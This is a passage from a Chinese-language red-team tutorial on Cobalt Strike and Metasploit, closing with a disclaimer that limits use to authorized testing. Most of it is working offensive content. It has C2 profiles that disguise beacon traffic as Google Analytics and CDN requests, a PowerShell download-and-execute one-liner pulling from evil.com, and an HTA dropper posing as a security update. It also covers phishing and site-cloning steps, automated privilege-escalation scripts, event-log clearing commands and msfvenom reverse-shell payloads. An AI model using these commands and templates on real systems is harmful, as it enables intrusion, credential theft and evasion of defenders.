   - 检查：是否随机化（每次请求不同）
```

### 5.6 Profile 测试与验证

```bash
# 语法检查
./c2lint /path/to/profile.profile

# 使用 Wireshark 抓包检查
# 在 Team Server 端抓包
tcpdump -i eth0 port 80 -w cs_traffic.pcap

# 在 WireShark 中检查：
# 1. TLS 握手特征（HTTPS）
# 2. HTTP 请求头顺序
# 3. URI 路径
# 4. 响应数据格式
# 5. 数据包大小分布

# 使用 JARM 指纹混淆
# 需要修改 TLS 库版本和加密套件
```

### 5.7 常见 Profile 模板

**模拟 Google Analytics：**
```sleep
http-get {
    set uri "/collect";
    set verb "GET";
    client {
        header "Accept" "*/*";
        header "User-Agent" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";
        metadata {
            base64url;
            parameter "v";
            prepend "2";
            parameter "tid";
            append "UA-12345678-1";
            parameter "cid";
            print;
        }
    }
    server {
        header "Content-Type" "image/gif";
        header "Cache-Control" "private, no-cache, no-cache=Set-Cookie, proxy-revalidate";
        output {
            prepend "GIF89a";
            append "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00";
            print;
        }
    }
}
```

**模拟 CDN JS 请求：**
```sleep
http-get {
    set uri {
        "/assets/js/chunk-vendors.js";
        "/assets/js/app.js";
        "/assets/js/main.js";
        "/static/js/2.30b1c5e0.chunk.js";
    }
    set verb "GET";
    client {
        header "Accept" "*/*";
        header "Accept-Language" "zh-CN,zh;q=0.9,en;q=0.8";
        header "Referer" "https://dashboard.company.com/";
        header "User-Agent" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";
        metadata {
            base64url;
            parameter "_t";
            print;
        }
    }
    server {
        header "Content-Type" "application/javascript";
        header "Cache-Control" "public, max-age=31536000";
        header "Server" "cloudflare";
        output {
            mask;
            base64url;
            prepend "!function(){var n={";
            append "}};";
            print;
        }
    }
}
```

---

## 第六章：社会工程学攻击

Cobalt Strike 内置强大的社会工程学模块，主要用于**钓鱼攻击**和**水坑攻击**。

> ⚠️ **警告**：以下内容仅用于授权渗透测试。

### 6.1 钓鱼邮件（Spear Phishing）

```bash
# 通过菜单创建：
# Attacks → Spoof Email → 新建

# 字段说明：
# To:         目标邮箱地址
# From:       伪造发件人（如 support@company.com）
# CC:         抄送
# BCC:        密送
# Reply-To:   回复地址
# Subject:    邮件主题（需精心编写）
# Attachments: 附件（payload）
# Mail Server: SMTP 服务器

# SMTP 配置
# 使用有效 SMTP 服务器：
# - 自建邮件服务器
# - 被窃取的 SMTP 凭据
# - 使用第三方邮件 API

# 邮件内容编写原则
# 1. 相关业务场景（财务、IT、HR）
# 2. 紧迫感（逾期、违规、安全通知）
# 3. 社会工程学诱导（领导指示、系统升级）
# 4. 良好的排版
```

### 6.2 Web 钓鱼

```bash
# 克隆网站
# Attacks → Web Drive-by → Clone Site

# 克隆配置：
# - 克隆 URL：要克隆的目标网站 URL
# - 监听器：选择已创建的 Listener
# - 日志记录：记录输入的凭证

# 克隆后，CS 会托管一个与目标完全相同的网站
# 目标会在后台收到 payload

# 自定义钓鱼页面
# System → Web Drive-by → Host File
# 托管自定义 HTML 页面
# 页面中包含 beacon 下载链接
```

### 6.3 Scripted Web Delivery

```bash
# 生成通过 Web 传递的 payload
# Attacks → Web Drive-by → Scripted Web Delivery (S)

# 选择：
# - 目标类型：PowerShell/Python/VBS
# - Listener：选择监听器
# - URI 路径：自定义路径

# 生成后，CS 提供一个 URL：
# http://evil.com/xxx/yyy
# 目标访问后自动执行 payload

# PowerShell 示例（无文件落地）
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://evil.com/a'))"
```

### 6.4 Office 宏攻击

```bash
# 生成 Office 宏
# Attacks → Packages → Office Macro

# 选择：
# - Listener
# - 输出格式：VBA 代码

# 生成的宏插入到 Office 文档中
# 常用：
# - Word 文档（业务报告、报价单）
# - Excel 文档（财务报表）
# - PPT 文档（演示文稿）

# 规避宏安全检查：
# 1. 文档内容诱导启用宏
# 2. 签名证书（窃取或自签）
# 3. 使用 VBA stomping
# 4. 使用 xll/.NET add-in
```

### 6.5 HTA 攻击

```bash
# 生成 HTA 文件
# Attacks → Packages → HTML Application

# 使用 HTA 下载执行 payload
# 常配合邮件附件使用

# HTA 示例
<html>
<head>
<title>Security Update</title>
<HTA:APPLICATION ID="update" APPLICATIONNAME="WindowsUpdate" />
<script language="VBScript">
    Set WshShell = CreateObject("WScript.Shell")
    WshShell.Run "powershell -nop -w hidden -e <base64_payload>", 0
    window.close()
</script>
</head>
<body>
<h1>Installing critical update...</h1>
</body>
</html>
```

---

## 第七章：Aggressor Script

Aggressor Script 是 Cobalt Strike 的脚本系统，使用 Sleep 语言（类似 Perl/PHP 的语法），可以自定义和扩展几乎 CS 的所有功能。

### 7.1 基本语法

```sleep
# 注释
# 变量
$x = 10;
$name = "admin";
$ips = @("192.168.1.1", "10.0.0.1");

# 条件
if ($x > 5) {
    println("x is greater than 5");
} else {
    println("x is 5 or less");
}

# 循环
foreach $ip ($ips) {
    println("IP: $ip");
}

for ($i = 0; $i < 5; $i++) {
    println("Count: $i");
}

# 函数
sub hello {
    local('$name');
    $name = $1;  # 第一个参数
    return "Hello, $name";
}

println(hello("World"));
```

### 7.2 常用钩子（Hooks）

```sleep
# 自定义菜单
popup beacon_bottom {
    # 在 Beacon 右键菜单底部添加选项
    item "Run Custom Script" {
        # 向选中 beacon 发送命令
        binput($1, "powershell -exec bypass -f c:\\tools\\script.ps1");
    }
    item "Open Network Share" {
        binput($1, "shell net use \\\\target\\share password /user:admin");
    }
    separator();
    item "&Clean Up" {
        binput($1, "rm C:\\Users\\Public\\beacon.exe");
        binput($1, "rm C:\\Windows\\Temp\\*.ps1");
    }
}

# 监听新 beacon 上线
on beacon_initial {
    # $1 = beacon ID
    local('$bid');
    $bid = $1;
    println("[+] New beacon: $bid");

    # 自动执行初始命令
    binput($bid, "sleep 30 20");
    binput($bid, "getuid");
    binput($bid, "ipconfig");
    binput($bid, "run net view");
    binput($bid, "run whoami /all");
}

# 监听新目标发现
on host_added {
    # $1 = beacon ID, $2 = host 结构体
    println("[+] New host: " . $2['address'] . " (" . $2['name'] . ")");
}

# 监听凭证捕获
on credential_shared {
    # $1 = credential 结构体
    println("[+] Credential: " . $1['user'] . ":" . $1['password'] . " [" . $1['realm'] . "]");
}
```

### 7.3 自定义命令

```sleep
# 注册自定义 Beacon 命令
command coffee {
    # $1 = beacon ID
    binput($1, "shell echo Drink your coffee with ")
    binput($1, "whoami")
}
# 在 Beacon 控制台输入: coffee

# 注册自定义命令（带参数）
command enum {
    local('$host $bid');
    $bid = $1;
    $host = $2;

    if ($host eq '') {
        blog($bid, "Usage: enum [host]");
        return;
    }

    binput($bid, "shell net view \\\\$host");
    binput($bid, "shell dir \\\\$host\\C$");
    binput($bid, "shell wmic /node:$host process list");
}
blog($3, "Enumeration of $host started");
```

### 7.4 自动任务

```sleep
# 自动后渗透脚本
sub auto_collect {
    local('$bid');
    $bid = $1;

    # 信息收集
    binput($bid, "getuid");
    binput($bid, "ipconfig /all");
    binput($bid, "net view");
    binput($bid, "net group \"Domain Admins\" /domain");
    binput($bid, "ps");

    # 检测杀软
    binput($bid, "shell wmic /namespace:\\\\root\\securitycenter2 path antivirusproduct GET displayName");

    # 电源管理（避免屏幕关闭）
    binput($bid, "shell powercfg -change -monitor-timeout-ac 0");
    binput($bid, "shell powercfg -change -standby-timeout-ac 0");
}

# 自动提权尝试
sub auto_escalate {
    local('$bid $result');
    $bid = $1;

    # 检查 token
    binput($bid, "whoami /all");

    # 提权尝试
    belevate($bid, "ms14-058", "https-listener");
    belevate($bid, "ms15-051", "https-listener");
    belevate($bid, "uac-token-duplication", "https-listener");
}
```

### 7.5 自定义报告

```sleep
# 自定义报告函数
sub generate_report {
    local('$filename $content');

    $filename = "report_" . ticks() . ".html";
    $content = "
    <html>
    <head><title>Penetration Test Report</title></head>
    <body>
    <h1>Access Granted Targets</h1>
    <table border='1'>
    <tr><th>Host</th><th>User</th><th>Access Level</th></tr>
    ";

    # 遍历所有 beacon
    foreach $bid (beacon_ids()) {
        local('$info');
        $info = beacon_info($bid, "computer", "user", "access");
        $content .= "<tr>";
        $content .= "<td>" . $info['computer'] . "</td>";
        $content .= "<td>" . $info['user'] . "</td>";
        $content .= "<td>" . $info['access'] . "</td>";
        $content .= "</tr>\n";
    }

    $content .= "</table></body></html>";

    # 写入本地文件
    openf($fd, ">$filename");
    writef($fd, $content);
    closef($fd);

    println("[+] Report saved to: $filename");
}
```

### 7.6 常用 Aggressor Script 资源

```bash
# 官方资源
CS 安装目录下的 /scripts/ 文件夹有示例脚本

# 社区优秀脚本推荐：
# 1. Erebus - 提权辅助
# 2. AK47 - 自动化后渗透
# 3. ProcessColor - 进程标注
# 4. TrustedSec BOF - BOF 集合
# 5. CS-Community-Kit - 社区资源包
```

---

## 第八章：Beacon Object File (BOF)

BOF 是 Cobalt Strike 4.0+ 引入的**轻量级扩展**机制，可以在不生成新 beacon 的情况下执行 C 代码。

### 8.1 BOF 的优势

| 特性 | 说明 |
|------|------|
| **微体积** | 编译后 1-20KB |
| **无文件** | 全部在内存中运行 |
| **无新进程** | 在 beacon 进程中执行 |
| **无 DLL** | 不加载任何 DLL |
| **速度快** | 即时执行 |
| **隐蔽** | 更少 API 调用，更难检测 |

### 8.2 BOF 结构

```c
// bof_example.c
#include <windows.h>
#include "beacon.h"

// 参数声明
DECLSPEC_IMPORT void WINAPI MSVCRT$printf(const char *format, ...);
DECLSPEC_IMPORT void WINAPI MSVCRT$exit(int code);

void go(char *args, int len) {
    // 解析参数
    datap parser;
    char *target;
    
    BeaconDataParse(&parser, args, len);
    target = BeaconDataExtract(&parser);
    
    // 执行操作
    MSVCRT$printf("Target: %s\n", target);
    
    // 返回结果给 beacon
    BeaconPrintf(CALLBACK_OUTPUT, "Hello from BOF! Target: %s", target);
}
```

### 8.3 BOF 头文件（beacon.h）

```c
// beacon.h - 关键函数声明
// 由 Cobalt Strike 提供，位于 CS 安装目录下的 BOF/ 文件夹

#define CALLBACK_OUTPUT 0
#define CALLBACK_OUTPUT_OEM 0x1e
#define CALLBACK_ERROR 0x0d
#define CALLBACK_OUTPUT_UTF8 0x20

// 参数解析
void BeaconDataParse(datap *parser, char *buffer, int size);
int BeaconDataInt(datap *parser);
short BeaconDataShort(datap *parser);
int BeaconDataLength(datap *parser);
char* BeaconDataExtract(datap *parser);
char* BeaconDataSubstring(datap *parser, int start, int len);

// 输出
void BeaconPrintf(int type, char *fmt, ...);
void BeaconOutput(int type, char *data, int len);

// API 调用
DECLSPEC_IMPORT void WINAPI KERNEL32$Sleep(int ms);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateThread(...);
```

### 8.4 编译 BOF

```bash
# 使用 MinGW 交叉编译
# Linux 上编译 Windows BOF
x86_64-w64-mingw32-gcc -c bof_example.c -o bof_example.o
i686-w64-mingw32-gcc -c bof_example_x86.c -o bof_example_x86.o

# Mac 上
# 使用 cross-compiler 工具链
```

### 8.5 在 Beacon 中执行 BOF

```beacon
# 在 Beacon 控制台加载并执行
cd /path/to/bofs
execute-assembly /tmp/BOF/execute-assembly/bof_example.o "target1"
```

### 8.6 常见 BOF 集合

```bash
# 社区常见 BOF：
# 1. TrustedSec BOF Collection
#  - directory  - 列出目录
#  - enum_localy - 本地枚举
#  - etc.

# 2. COFFLoader - 通用 COFF 加载器

# 3. BOF.NET - .NET 程序加载器

# 4. SharpCollection - C# 工具 BOF 化
```

---

## 第九章：红队操作技巧

### 9.1 OpSec 最佳实践

#### Team Server 保护

```bash
# 1. 使用前置代理/跳板机
# 不建议将 Team Server 直接暴露在公网
# 方案：
#   - Nginx 反向代理（根据域名转发）
#   - Cloudflare CDN（隐藏真实 IP）
#   - SSH 隧道转发

# Nginx 反向代理配置
server {
    listen 80;
    server_name cdn.company.com;
    location / {
        proxy_pass http://127.0.0.1:80;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }
}

# 2. 使用防火墙严格限制入站
iptables -A INPUT -p tcp -m multiport --dports 80,443 -m state \
  --state ESTABLISHED,NEW -j ACCEPT
iptables -A INPUT -p tcp --dport 55553 -m state \
  --state ESTABLISHED,NEW -s yourcompany.ip/24 -j ACCEPT
iptables -A INPUT -j DROP

# 3. 禁止 ICMP 响应
echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all

# 4. 不保留任何默认文件
# 删除安装说明、更新脚本等
```

#### Beacon 隐蔽

```beacon
# 1. 设置合理的睡眠时间
sleep 60 30           # 1分钟 ± 30秒抖动
sleep 300 120          # 5分钟 ± 2分钟抖动

# 2. 使用 HTTP 而非 HTTPS（HTTPS 更容易被解密检查）
#    但 HTTPS 在受 SSL 检查环境中更危险

# 3. 不使用默认端口（80/443 反而更显眼）
#    可以考虑 8080, 8443, 9000 等

# 4. 设置 User-Agent 为常见浏览器/客户端
#    在 Malleable Profile 中设置

# 5. 避免高峰期大流量通信

# 6. 不要长时间保持连接
#    设置闲时更长睡眠
```

#### 操作安全

```beacon
# 1. 避免敏感命令
#    - 不在 beacon 控制台输密码
#    - 不使用明文鉴权

# 2. 清理文件
# 上传工具使用后删除
rm C:\Users\Public\tools.exe

# 3. 日志清理
clear                    # 清除事件日志
shell wevtutil cl system  # 清系统日志
shell wevtutil cl security  # 清安全日志
shell wevtutil cl application  # 清应用日志

# 4. 避免震网（不要做破坏性操作）

# 5. 使用 Jump 减少流量特征
#    使用 SMB/TCP beacon 在内网传输
```

### 9.2 团队协作技巧

```bash
# 1. 分工明确
#   - 侦察组：信息收集
#   - 打点组：初始入口
#   - 横向组：内网横向
#   - 数据组：数据提取

# 2. 使用 CS 的 Data Management
#   - 共享凭证库
#   - 共享目标列表
#   - 共享漏洞信息

# 3. 利用注释功能
# 在 Targets 和 Credentials 中添加注释
# 注明发现时间和方式

# 4. 使用 Aggressor Script 统一规范
#  - beacon 命名规范
#  - 文件路径规范
#  - 报告格式统一
```

### 9.3 多阶段攻击流程

```bash
# 第1阶段：外部打点
#   - 扫描对外开放服务
#   - Web 漏洞探测
#   - 弱口令爆破
#   - 钓鱼攻击

# 第2阶段：初始访问
#   - 执行 payload
#   - 获取 HTTP/HTTPS beacon
#   - 绕过 WAF/IPS

# 第3阶段：内网立足
#   - 系统信息收集
#   - 提权到 SYSTEM
#   - 安装 SMB/TCP beacon 用于横向
#   - 收集凭证

# 第4阶段：横向移动
#   - 使用跳板扫描内网
#   - Pass-the-Hash/WMI/SMB 横向
#   - 扩展控制范围到域控

# 第5阶段：数据提取
#   - 定位目标数据
#   - 分批提取
#   - 清理痕迹

# 第6阶段：收尾
#   - 清理所有文件
#   - 恢复系统配置
#   - 编写报告
```

---

## 第十章：MSF + CS 联合作战

实际渗透测试中，MSF 和 CS 常配合使用，发挥各自优势。

### 10.1 通过 MSF 接收 CS Beacon

**场景**：CS 中的 beacon 无法直连出网，需要 MSF 作为中转。

```bash
# 在第1个 CS beacon 中
# 生成反向 shell 供 MSF 接收
shell msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=5555 -f exe -o /tmp/msf_payload.exe
upload /tmp/msf_payload.exe C:\ProgramData\msf_payload.exe
shell C:\ProgramData\msf_payload.exe

# 在 MSF 中
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 127.0.0.1
set LPORT 5555
run

# 现在 MSF 通过 CS 建立的隧道获得了一个新会话
```

### 10.2 CS 作为 MSF 的跳板

```beacon
# CS beacon 建立 SOCKS 代理
socks 1080

# 在 MSF 中（配置 proxychains 或 MSF 代理）
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.10.10.0/24
set THREADS 20
set Proxies socks4:127.0.0.1:1080
run

# 或直接在 msfconsole 中
# 使用 CS 的 SOCKS 代理作为路由
route add 10.10.10.0 255.255.255.0 1
```

### 10.3 MSF 的 exploit 通过 CS 传递

```bash
# 1. CS 上传 msf 的 payload 到目标
beacon> upload /tmp/msf_shell.exe C:\Windows\temp\msf_shell.exe
beacon> shell C:\Windows\temp\msf_shell.exe

# 2. CS 转发 msf handler 的流量（端口转发）
beacon> rportfwd 4444 192.168.1.100 4444

# 3. 使用 msfvenom 生成 CS 友好的 payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<CS_TEAM_SERVER> LPORT=4444 \
  -f raw -o /tmp/msf_payload.bin

# 4. 在 CS 中使用 External C2 桥接
```

### 10.4 功能对比与选择

| 需求场景 | 推荐工具 | 原因 |
|----------|----------|------|
| 漏洞利用、exploit 库 | MSF | MSF 模块库更丰富 |
| 团队协作 | CS | CS 的团队架构更完善 |
| 流量隐匿 | CS | Malleable C2 高度自定义 |
| shellcode 生成 | MSF | msfvenom 更强大 |
| 横向移动 | MSF + CS | 结合使用 |
| 凭证收集 | CS | Mimikatz 集成更好 |
| 自定义扩展 | CS | BOF + Aggressor Script |
| 报告生成 | CS | 内置团队报告 |
| 价格敏感 | MSF | 免费开源 |

---

## 附录

### A. 常用命令速查表

#### MSF 常用命令

```bash
msfconsole              # 启动控制台
db_status               # 数据库状态
workspace               # 工作区管理
search <keyword>        # 搜索模块
use <module_path>       # 使用模块
show options            # 查看选项
show payloads           # 查看 payload
show targets            # 查看目标
set <option> <value>    # 设置选项
run/exploit             # 执行
check                   # 检查漏洞
sessions                # 会话管理
background              # 后台会话
jobs                    # 作业管理
resource <script>       # 运行资源脚本
route                   # 路由管理
```

#### CS 常用命令（Beacon 控制台）

```beacon
help                    # 帮助
sleep <s> <jitter>      # 设置睡眠
checkin                 # 强制回连
shell <cmd>             # 执行 cmd
run <cmd>               # 执行命令
powershell <cmd>        # 执行 PowerShell
getuid                  # 用户
getsystem               # 提权
ipconfig                # 网络
net <subcmd>            # net 命令
ps                      # 进程
kill <PID>              # 杀进程
upload                  # 上传
download                # 下载
ls                      # 列表
cd                      # 切换目录
socks <port>            # 代理
rportfwd                # 端口转发
inject <PID> <listener> # 进程注入
logonpasswords          # 抓密码
hashdump                # 哈希
screenshot              # 截图
keylogger               # 键盘记录
mimikatz <cmd>          # Mimikatz
peth <user> <hash>      # 哈希传递
jump <type> <target> <listener>  # 横向移动
elevate <method> <listener>      # 提权
persistence <listener> <method>  # 持久化
execute-assembly        # 执行 .NET
```

### B. 端口规划

| 端口 | 工具 | 用途 |
|------|------|------|
| 21 | MSF | FTP 扫描/利用 |
| 22 | Both | SSH 连接/利用 |
| 80 | CS | HTTP Listener |
| 443 | CS | HTTPS Listener |
| 445 | Both | SMB 横向移动 |
| 53 | CS | DNS Listener |
| 1080 | CS | SOCKS 代理 |
| 3306 | MSF | MySQL 利用 |
| 3389 | Both | RDP 扫描/利用 |
| 4444 | MSF | Meterpreter 监听 |
| 5553 | CS | DNS Listener |
| 55553 | CS | Team Server |
| 8080 | CS | 备用 HTTP Listener |
| 8443 | CS | 备用 HTTPS Listener |

### C. 学习路径建议

```
阶段1：基础（1-2周）
├── 了解 MSF 基本架构
├── 掌握模块搜索与使用
├── 理解 payload 类型（reverse/bind、staged/stageless）
├── 掌握 msfvenom 基本用法
└── 完成 2-3 个目标的基本利用

阶段2：进阶（2-4周）
├── Meterpreter 后渗透
├── 内网渗透（pivoting、横向移动）
├── 凭证收集（Mimikatz/Kiwi）
├── 提权技术
└── CS 基础环境搭建与基础功能

阶段3：精通（4-8周）
├── CS Malleable C2 Profile 编写
├── Aggressor Script 脚本开发
├── BOF 编写与使用
├── 流量隐身技术
├── 免杀技术
├── MSF 模块开发
└── 红队流程实战

阶段4：实战（持续）
├── 参加 CTF/渗透测试项目
├── 阅读 CVE 分析文章
├── 关注 EDR/AV 绕过技术
├── 构建自己的工具集
└── 总结复盘每次实战经验
```

### D. 学习资源

- **官方文档**：Rapid7 Metasploit Documentation、Cobalt Strike User Guide
- **经典书籍**：《Metasploit渗透测试指南》、《红队技术》
- **在线资源**：Zero Point Security、Pentester Academy、HTB/红日安全
- **社区**：Reddit r/netsec、GitHub security-tools、安全客/Freebuf
- **练习平台**：
  - HackTheBox (HTB)
  - TryHackMe (THM)
  - VulnHub
  - 红日安全靶场
  - 内网渗透靶场（Vulnstack）

---

> **免责声明**：本文档仅供网络安全学习和授权渗透测试使用。未经授权的扫描、利用、入侵是违法行为。请在法律法规允许的范围内使用所学知识，仅在拥有明确授权的环境中进行测试。
